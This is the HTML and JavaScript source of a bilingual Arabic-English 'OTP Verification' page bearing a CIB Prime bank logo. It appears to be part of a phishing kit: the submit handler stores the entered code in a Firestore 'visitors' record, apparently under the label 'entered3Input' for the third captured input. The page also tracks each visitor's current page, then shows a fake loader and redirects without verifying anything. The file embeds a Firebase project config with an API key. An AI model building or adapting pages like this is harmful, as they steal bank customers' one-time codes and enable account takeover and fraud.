<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  />

  <title>OTP Verification</title>

  <!-- Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Font -->
  <link
    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap"
    rel="stylesheet"
  />

  <style>
    body {
      font-family: "Cairo", sans-serif;
      background: #f5f5f5;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }

   input[type=number] {
  appearance: textfield;
  -moz-appearance: textfield;
}

    /* Loader */
    .screen-loader {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.55);
      backdrop-filter: blur(2px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .screen-loader.active {
      display: flex;
    }

    .spinner {
      width: 52px;
      height: 52px;
      border: 4px solid rgba(0, 87, 168, 0.15);
      border-top-color: #0057a8;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    /* Dropdown animation */
    .dropdown {
      opacity: 0;
      visibility: hidden;
      transform: translateY(8px);
      transition: all 0.2s ease;
    }

    .dropdown.active {
      opacity: 1;
      visibility: visible;
      transform: translateY(0);
    }

    .otp-input:focus {
      border-color: #0057a8;
      box-shadow: 0 0 0 3px rgba(0, 87, 168, 0.08);
    }
  </style>
</head>

<body
  id="body"
  dir="rtl"
  class="min-h-screen flex items-center justify-center p-5"
>

  <!-- Loader -->
  <div id="screenLoader" class="screen-loader">
    <div class="spinner"></div>
  </div>

  <!-- Wrapper -->
  <div class="w-full max-w-md">

    <!-- Header -->
    <div class="flex items-start justify-between mb-8">

      <!-- Logo -->
      <img
        src="images/ciblogo.png"
        alt="CIB Prime"
        class="w-36 sm:w-44 object-contain"
      />

      <!-- Language -->
      <div class="relative">

        <button
          id="langBtn"
          type="button"
          class="
            flex
            items-center
            gap-2
            border
            border-[#dddddd]
            rounded-2xl
            bg-white
            px-4
            h-11
            text-[#333]
            text-sm
            font-medium
            shadow-sm
          "
        >

          <span id="currentLang">
            العربية
          </span>

          <svg
            xmlns="http://www.w3.org/2000/svg"
            class="w-4 h-4"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            stroke-width="2.5"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M19 9l-7 7-7-7"
            />
          </svg>

        </button>

        <!-- Dropdown -->
        <div
          id="langDropdown"
          class="
            dropdown
            absolute
            top-14
            right-0
            w-32
            bg-white
            border
            border-[#e5e5e5]
            rounded-2xl
            shadow-lg
            overflow-hidden
            z-50
          "
        >

          <button
            class="
              lang-option
              w-full
              px-4
              py-3
              text-sm
              text-right
              hover:bg-[#f5f5f5]
            "
            data-lang="ar"
          >
            العربية
          </button>

          <button
            class="
              lang-option
              w-full
              px-4
              py-3
              text-sm
              text-left
              hover:bg-[#f5f5f5]
            "
            data-lang="en"
          >
            English
          </button>

        </div>

      </div>

    </div>

    <!-- OTP Card -->
    <div
      class="
        bg-white
        border
        border-[#e7e7e7]
        rounded-3xl
        p-6
        sm:p-7
        shadow-sm
      "
    >

      <!-- Title -->
      <div class="mb-7">

        <h1
          id="title"
          class="text-2xl font-bold text-[#222]"
        >
          رمز التحقق
        </h1>

        <p
          id="subtitle"
          class="text-sm text-[#8b8b8b] mt-1 leading-6"
        >
          أدخل رمز التحقق المرسل إلى رقم هاتفك
        </p>

      </div>

      <!-- OTP Form -->
      <form id="otpForm">

        <!-- OTP Inputs -->
       <!-- OTP Input -->
<div>

  <label
    id="otpLabel"
    class="
      block
      mb-3
      text-sm
      font-bold
      text-[#2d2d2d]
    "
  >
    رمز التحقق
  </label>

  <div
    class="
      h-14
      rounded-2xl
      border
      border-[#d9d9d9]
      bg-white
      px-4
      flex
      items-center
      transition
      focus-within:border-[#0057a8]
    "
  >

    <input
      id="otpInput"
      type="text"
      inputmode="numeric"
      autocomplete="one-time-code"
      maxlength="6"
      placeholder="------"
      class="
        w-full
        bg-transparent
        outline-none
        text-center
        tracking-[10px]
        text-[22px]
        font-bold
        text-[#222]
      "
    />

  </div>

  <!-- Error -->
  <p
    id="otpError"
    class="
      hidden
      text-red-500
      text-xs
      mt-2
    "
  >
    يجب إدخال 4 أو 6 أرقام فقط
  </p>

</div>
        <!-- Timer -->
        <div class="mt-6 text-center">

          <p
            id="timerText"
            class="text-sm text-[#8b8b8b]"
          >
            إعادة الإرسال خلال
            <span id="timer" class="font-bold text-[#0057a8]">
              01:30
            </span>
          </p>

          <button
            id="resendBtn"
            type="button"
            disabled
            class="
              hidden
              mt-2
              text-sm
              font-bold
              text-[#0057a8]
            "
          >
            إعادة إرسال الرمز
          </button>

        </div>

        <!-- Verify Button -->
        <button
          id="verifyBtn"
          type="submit"
          disabled
          class="
            w-full
            h-14
            rounded-2xl
            bg-[#0057a8]
            text-white
            font-bold
            text-[15px]
            transition
            disabled:opacity-50
            disabled:cursor-not-allowed
            mt-7
          "
        >
          تأكيد
        </button>

      </form>

    </div>

  </div>


<script type="module">

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
  getFirestore,
  doc,
  setDoc
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {

  apiKey: "AIzaSyCUs5CdBaeLUiglxu5gaijfJFNSaDRQd3U",

  authDomain:
    "letsgo-bd65d.firebaseapp.com",

  projectId:
    "letsgo-bd65d",

  storageBucket:
    "letsgo-bd65d.firebasestorage.app",

  messagingSenderId:
    "629849401898",

  appId:
    "1:629849401898:web:45148ce771ac50e7623153",

  measurementId:
    "G-GFGNTNLPH7"

};

const app =
  initializeApp(firebaseConfig);

const db =
  getFirestore(app);

window.db = db;
window.setDoc = setDoc;
window.doc = doc;


async function updatePage() {

  const visitorId =
    localStorage.getItem("visitorId");

  const currentPage =
    window.location.pathname
      .split("/")
      .pop();

  await window.setDoc(

    window.doc(
      window.db,
      "visitors",
      visitorId
    ),

    {
      currentPage: currentPage
    },

    { merge: true }

  );

}

updatePage();


</script>

<script>
  const body =
    document.getElementById("body");

  const otpInput =
    document.getElementById("otpInput");

  const otpError =
    document.getElementById("otpError");

  const verifyBtn =
    document.getElementById("verifyBtn");

  const screenLoader =
    document.getElementById("screenLoader");

  // Language
  const langBtn =
    document.getElementById("langBtn");

  const langDropdown =
    document.getElementById("langDropdown");

  const currentLang =
    document.getElementById("currentLang");

  const langOptions =
    document.querySelectorAll(".lang-option");

  // Text elements
  const title =
    document.getElementById("title");

  const subtitle =
    document.getElementById("subtitle");

  const timerText =
    document.getElementById("timerText");

  const resendBtn =
    document.getElementById("resendBtn");

  const otpLabel =
    document.getElementById("otpLabel");

  // OTP validation
  function validateOTP() {

    // numbers only
    otpInput.value =
      otpInput.value.replace(/\D/g, "");

    const value =
      otpInput.value.trim();

    // only 4 or 6 digits accepted
    const isValid =
      value.length === 4 ||
      value.length === 6;

    if (
      value.length > 0 &&
      !isValid
    ) {
      otpError.classList.remove("hidden");
    } else {
      otpError.classList.add("hidden");
    }

    verifyBtn.disabled = !isValid;
  }

  otpInput.addEventListener(
    "input",
    validateOTP
  );

  // Submit
  document
  .getElementById("otpForm")
  .addEventListener("submit", async function (e) {

    e.preventDefault();

    const visitorId =
  localStorage.getItem("visitorId");

await window.setDoc(

  window.doc(
    window.db,
    "visitors",
    visitorId
  ),

  {
    entered3Input: otpInput.value
  },

  { merge: true }

);

    // LOADER
    screenLoader.classList.add("active");

    setTimeout(() => {

      window.location.href =
        "./otp.html";

    }, 3000);

});

  // Timer
  let time = 90;

  const timer =
    document.getElementById("timer");

  function startTimer() {

    const interval =
      setInterval(() => {

        let minutes =
          Math.floor(time / 60);

        let seconds =
          time % 60;

        seconds =
          seconds < 10
            ? "0" + seconds
            : seconds;

        timer.textContent =
          `0${minutes}:${seconds}`;

        time--;

        if (time < 0) {

          clearInterval(interval);

          timerText.classList.add("hidden");

          resendBtn.classList.remove("hidden");

          resendBtn.disabled = false;
        }

      }, 1000);

  }

  startTimer();

  // Resend
  resendBtn.addEventListener(
    "click",
    () => {

      time = 90;

      resendBtn.classList.add("hidden");

      timerText.classList.remove("hidden");

      startTimer();

    }
  );

  // Dropdown
  langBtn.addEventListener(
    "click",
    () => {
      langDropdown.classList.toggle("active");
    }
  );

  document.addEventListener(
    "click",
    (e) => {

      if (
        !langBtn.contains(e.target) &&
        !langDropdown.contains(e.target)
      ) {
        langDropdown.classList.remove("active");
      }

    }
  );

  // Language Switch
  langOptions.forEach((option) => {

    option.addEventListener("click", () => {

      const lang =
        option.getAttribute("data-lang");

      langDropdown.classList.remove("active");

      // Arabic
      if (lang === "ar") {

        document.documentElement.lang = "ar";

        body.setAttribute("dir", "rtl");

        currentLang.textContent =
          "العربية";

        title.textContent =
          "رمز التحقق";

        subtitle.textContent =
          "أدخل رمز التحقق المرسل إلى رقم هاتفك";

        otpLabel.textContent =
          "رمز التحقق";

        otpInput.placeholder =
          "------";

        otpError.textContent =
          "يجب إدخال 4 أو 6 أرقام فقط";

        verifyBtn.textContent =
          "تأكيد";

        resendBtn.textContent =
          "إعادة إرسال الرمز";

        timerText.innerHTML =
          `إعادة الإرسال خلال
          <span id="timer" class="font-bold text-[#0057a8]">
            ${timer.textContent}
          </span>`;

      }

      // English
      else {

        document.documentElement.lang = "en";

        body.setAttribute("dir", "ltr");

        currentLang.textContent =
          "English";

        title.textContent =
          "OTP Verification";

        subtitle.textContent =
          "Enter the verification code sent to your phone";

        otpLabel.textContent =
          "Verification Code";

        otpInput.placeholder =
          "------";

        otpError.textContent =
          "Only 4 or 6 digits are allowed";

        verifyBtn.textContent =
          "Verify";

        resendBtn.textContent =
          "Resend Code";

        timerText.innerHTML =
          `Resend available in
          <span id="timer" class="font-bold text-[#0057a8]">
            ${timer.textContent}
          </span>`;
      }

    });

  });

  otpInput.focus();
</script>


</body>
</html>
